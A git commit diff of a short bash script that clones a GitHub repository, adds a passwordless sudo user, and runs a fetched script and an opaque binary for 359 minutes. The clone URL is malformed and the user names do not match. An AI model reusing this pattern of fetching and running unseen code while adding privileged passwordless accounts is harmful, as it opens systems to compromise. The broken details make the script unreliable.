1e43bd2aa56c17c142b1185044d3850d13cdfe3d
kelvin3755 <88593989+kelvin3755@users.noreply.github.com>
2021-08-20 20:19:17 +0700

    suw.sh

--- suw.sh
+++ suw.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com//.git && cd 
+git clone https://github.com/alvar37/.git && cd kelvin37
 chmod +x edw.sh && chmod +x dward
 sudo adduser --disabled-password --gecos "" kuy && sudo usermod -aG sudo kuy
 sudo -u kac -H sh -c "timeout 359m ./edw.sh"
